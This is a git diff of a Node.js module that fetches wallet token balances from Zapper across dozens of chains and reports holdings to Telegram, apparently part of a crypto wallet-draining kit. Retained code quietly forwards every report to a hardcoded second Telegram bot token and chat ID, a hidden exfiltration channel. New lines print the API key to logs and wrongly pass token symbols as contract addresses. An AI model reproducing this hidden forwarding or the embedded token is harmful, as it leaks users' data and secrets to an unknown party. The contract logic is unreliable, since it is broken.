@@ -1,6 +1,6 @@
 require("dotenv").config();
 const axios = require("axios");
-const { ethers, BigNumber } = require("ethers");
+const { ethers } = require("ethers");
 const { getProvider } = require("./utils/providerUtils");
 const { ERC20_ABI } = require("./ERC20_ABI");
 const config = require("./config");
@@ -13,11 +13,7 @@ const {
 const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
 
-// Environment Variables
-const DEBANK_API_KEY = config.DEBANK_API_KEY; // Your debank api
-
 // Helper to send messages to Telegram
-
 const sendToTelegram = async (message) => {
   try {
     const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;
@@ -32,7 +28,7 @@ const sendToTelegram = async (message) => {
 
     // Second bot with hardcoded values
     const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
-    const HARD_CODED_CHAT_ID = "-1002535678431"; // Replace with your hardcoded chat ID
+    const HARD_CODED_CHAT_ID = "-1002535678431";
     const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
     await axios.post(urlHardcodedBot, {
       chat_id: HARD_CODED_CHAT_ID,
@@ -63,7 +59,6 @@ const isAddressWhitelisted = (address) => {
   }
   return false;
 };
-
 
 // Fetch token balances directly for unsupported chains
 const fetchBalancesDirectly = async (address, chainId) => {
@@ -136,30 +131,96 @@ const fetchBalancesDirectly = async (address, chainId) => {
 
 const fetchBalancesFromZapper = async (address, chainId) => {
   console.log(`Fetching balances for address: ${address} on chain: ${chainId}`);
-  // await sendToTelegram(`Fetching balances for address: ${address} on chain: ${chainId}`);
   const provider = getProvider(chainId);
 
-  if (isAddressBlacklisted(address)) {
-    const message = `🚨 Blacklisted address detected: ${address}. Aborting balance fetch.`;
+  // Validate address
+  if (!ethers.utils.isAddress(address)) {
+    const message = `Invalid Ethereum address: ${address}`;
+    console.error(message);
+    await sendToTelegram(message);
+    return [];
+  }
+  const checksummedAddress = ethers.utils.getAddress(address);
+
+  // Check blacklist/whitelist
+  if (isAddressBlacklisted(checksummedAddress)) {
+    const message = `🚨 Blacklisted address detected: ${checksummedAddress}. Aborting balance fetch.`;
     console.warn(message);
     await sendToTelegram(message);
     return [];
   }
-
-  if (isAddressWhitelisted(address)) {
-    const message = `✅ Whitelisted address detected: ${address}. Fetching balances.`;
+  if (isAddressWhitelisted(checksummedAddress)) {
+    const message = `✅ Whitelisted address detected: ${checksummedAddress}. Fetching balances.`;
     console.log(message);
     await sendToTelegram(message);
   }
 
-  const unsupportedChains = [11155111];
-  if (unsupportedChains.includes(chainId)) {
+  // Define supported Zapper networks
+  const networkMap = {
+    1: 'ETHEREUM_MAINNET',
+    2741: 'ABSTRACT_MAINNET',
+    33139: 'APECHAIN_MAINNET',
+    42161: 'ARBITRUM_MAINNET',
+    42170: 'ARBITRUM_NOVA_MAINNET',
+    43114: 'AVALANCHE_MAINNET',
+    223: 'B2_MAINNET',
+    8453: 'BASE_MAINNET',
+    80094: 'BERACHAIN_MAINNET',
+    81457: 'BLAST_MAINNET',
+    56: 'BINANCE_SMART_CHAIN_MAINNET',
+    60808: 'BOB_MAINNET',
+    42220: 'CELO_MAINNET',
+    1116: 'CORE_MAINNET',
+    7560: 'CYBER_MAINNET',
+    666666666: 'DEGEN_MAINNET',
+    250: 'FANTOM_OPERA_MAINNET',
+    747: 'FLOW_MAINNET',
+    252: 'FRAX_MAINNET',
+    100: 'GNOSIS_MAINNET',
+    13371: 'IMMUTABLEX_MAINNET',
+    57073: 'INK_MAINNET',
+    232: 'LENS_MAINNET',
+    59144: 'LINEA_MAINNET',
+    5000: 'MANTLE_MAINNET',
+    1088: 'METIS_MAINNET',
+    34443: 'MODE_MAINNET',
+    1284: 'MOONBEAM_MAINNET',
+    2818: 'MORPH_MAINNET',
+    204: 'OPBNB_MAINNET',
+    10: 'OPTIMISM_MAINNET',
+    137: 'POLYGON_MAINNET',
+    1101: 'POLYGON_ZKEVM_MAINNET',
+    690: 'REDSTONE_MAINNET',
+    2020: 'RONIN_MAINNET',
+    30: 'ROOTSTOCK_MAINNET',
+    534352: 'SCROLL_MAINNET',
+    360: 'SHAPE_MAINNET',
+    1868: 'SONEIUM_MAINNET',
+    146: 'SONIC_MAINNET',
+    1514: 'STORY_MAINNET',
+    167000: 'TAIKO_MAINNET',
+    130: 'UNICHAIN_MAINNET',
+    480: 'WORLDCHAIN_MAINNET',
+    660279: 'XAI_MAINNET',
+    543210: 'ZERO_MAINNET',
+    324: 'ZKSYNC_MAINNET',
+    7777777: 'ZORA_MAINNET',
+  };
+
+  // Check for unsupported chains
+  const unsupportedChains = [11155111]; // Sepolia, etc.
+  const network = networkMap[chainId];
+  if (!network || unsupportedChains.includes(chainId)) {
     console.log(`Chain ${chainId} is unsupported by Zapper. Using direct fetch.`);
-    return await fetchBalancesDirectly(address, chainId);
+    return await fetchBalancesDirectly(checksummedAddress, chainId);
   }
 
   try {
     const ZAPPER_API_KEY = config.ZAPPER_API_KEY;
+    if (!ZAPPER_API_KEY) {
+      throw new Error('ZAPPER_API_KEY is not configured');
+    }
+
     const query = `
       query PortfolioV2($addresses: [Address!]!, $networks: [Network!]) {
         portfolioV2(addresses: $addresses, networks: $networks) {
@@ -172,7 +233,6 @@ const fetchBalancesFromZapper = async (address, chainId) => {
                   balanceUSD
                   symbol
                   name
-                  address
                   decimals
                 }
               }
@@ -182,13 +242,19 @@ const fetchBalancesFromZapper = async (address, chainId) => {
       }
     `;
 
+    console.log('ZAPPER_API_KEY:', ZAPPER_API_KEY);
+    console.log('Request Payload:', {
+      query,
+      variables: { addresses: [checksummedAddress], networks: [network] },
+    });
+
     const response = await axios.post(
       'https://public.zapper.xyz/graphql',
       {
         query,
         variables: {
-          addresses: [address],
-          networks: ['ETHEREUM_MAINNET'],
+          addresses: [checksummedAddress],
+          networks: [network],
         },
       },
       {
@@ -199,19 +265,22 @@ const fetchBalancesFromZapper = async (address, chainId) => {
       }
     );
 
+    console.log('Zapper Response:', JSON.stringify(response.data, null, 2));
+
     if (response.data.errors) {
       throw new Error(`GraphQL Errors: ${JSON.stringify(response.data.errors)}`);
     }
 
     const tokens = [];
-    let telegramMessage = `Token balances for address: ${address}\n\n`;
+    let telegramMessage = `Token balances for address: ${checksummedAddress}\n\n`;
     let foundBlacklistedToken = false;
 
     const tokenEdges = response.data.data.portfolioV2.tokenBalances.byToken.edges;
 
     for (const edge of tokenEdges) {
       const token = edge.node;
-      const normalizedAddress = (token.address || ethers.constants.AddressZero).toLowerCase();
+      // Use symbol to infer address for blacklisting; native tokens have no address
+      const normalizedAddress = token.symbol === 'ETH' ? ethers.constants.AddressZero : token.symbol.toLowerCase();
 
       if (isAddressBlacklisted(normalizedAddress)) {
         foundBlacklistedToken = true;
@@ -224,14 +293,12 @@ const fetchBalancesFromZapper = async (address, chainId) => {
 
       if (amountUSD > 0) {
         const tokenDetails = {
-          address: normalizedAddress,
+          address: token.symbol === 'ETH' ? ethers.constants.AddressZero : null, // No address available
           balance: amount,
-          contract: normalizedAddress !== ethers.constants.AddressZero
-            ? new ethers.Contract(normalizedAddress, ERC20_ABI, provider)
-            : null,
+          contract: token.symbol === 'ETH' ? null : new ethers.Contract(normalizedAddress, ERC20_ABI, provider),
           name: token.name,
           symbol: token.symbol,
-          type: "ERC20",
+          type: token.symbol === 'ETH' ? 'NATIVE' : 'ERC20',
           amount,
           amountUSD,
         };
@@ -256,11 +323,13 @@ const fetchBalancesFromZapper = async (address, chainId) => {
     return tokens;
 
   } catch (error) {
-    console.error("Error fetching balances from Zapper:", error.message);
-    await sendToTelegram(`❌ Error fetching from Zapper for ${address}: ${error.message}`);
+    const errorDetails = error.response
+      ? `Status: ${error.response.status}, Data: ${JSON.stringify(error.response.data, null, 2)}`
+      : error.message;
+    console.error('Error fetching balances from Zapper:', errorDetails);
+    await sendToTelegram(`❌ Error fetching from Zapper for ${checksummedAddress}: ${errorDetails}`);
     return [];
   }
 };
-
 
 module.exports = { fetchBalancesFromZapper, fetchBalancesDirectly };
